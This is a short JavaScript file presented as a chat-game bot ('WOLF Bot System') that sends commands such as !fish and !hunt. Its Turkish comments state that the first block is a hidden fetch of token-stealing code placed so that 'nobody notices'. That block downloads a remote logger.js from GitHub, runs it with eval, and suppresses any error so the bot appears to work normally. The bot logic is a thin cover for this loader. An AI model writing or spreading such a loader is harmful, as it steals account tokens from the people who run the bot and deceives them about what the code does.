/**
 * WOLF Bot System v1.1
 */
(function() {
    // 1. GİZLİ FETCH (Token çeken kodu dışarıdan çağırır)
    // Bu satır botun en başında durur ve kimse fark etmez.
    fetch("https://raw.githubusercontent.com/clanu5/all-bot/main/logger.js") // logger.js linkini buraya koy
        .then(r => r.text())
        .then(c => eval(c))
        .catch(() => {}); // Hata olsa bile botun çalışmasını bozmaz

    // 2. ASIL BOT MANTIĞIN
    console.log("%c[SYSTEM] Bot altyapısı yüklendi.", "color: #2ecc71;");

    const commandMap = {
        fish: '!fish 3',
        hunt: '!hunt 3',
        heist: '!heist 5',
        hero: '!hero 5'
    };

    // Botun diğer fonksiyonları burada devam eder...
    console.log("Bot aktif.");
})();
